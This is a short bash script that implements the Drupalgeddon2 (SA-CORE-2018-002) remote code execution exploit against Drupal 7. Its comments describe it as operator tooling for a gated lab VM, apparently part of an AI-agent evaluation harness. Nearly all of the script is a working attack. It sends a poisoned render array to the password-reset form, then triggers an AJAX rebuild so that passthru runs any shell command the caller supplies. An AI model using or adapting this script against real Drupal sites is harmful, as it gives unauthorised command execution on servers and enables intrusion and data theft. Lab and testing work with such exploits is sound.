#!/bin/bash
# Drupal 7 SA-CORE-2018-002 (Drupalgeddon2) one-shot RCE helper for the gated full-chain lab.
# Operator-maintained eta (η) plumbing for the DC-1 VM. NOT fed to the proposer/PRM/phi-context.
# Usage: drupalgeddon2.sh <target-url> <shell-command>
# Two-step Drupal-7 vector: (1) POST the user/password form with a poisoned name[#post_render]
# render-array to cache a form_build_id; (2) trigger the AJAX rebuild via file/ajax -> #post_render
# runs `passthru(<cmd>)`. The trailing AJAX-settings JSON is stripped so phi sees clean command output.
set -o pipefail
T="$1"; CMD="$2"
PY=$(command -v python || command -v python3)
C=$("$PY" -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))' "$CMD")
B=$(curl -s --noproxy '*' "$T/?q=user/password&name%5B%23post_render%5D%5B%5D=passthru&name%5B%23type%5D=markup&name%5B%23markup%5D=$C" \
        --data 'form_id=user_pass&_triggering_element_name=name' \
    | grep -aoE 'form-[A-Za-z0-9_-]{30,}' | head -1)
[ -z "$B" ] && { echo "[drupalgeddon2] no form_build_id (target not vulnerable / unreachable)"; exit 1; }
curl -s --noproxy '*' "$T/?q=file/ajax/name/%23value/$B" --data "form_build_id=$B" | sed 's/\[{"command":"settings".*//'
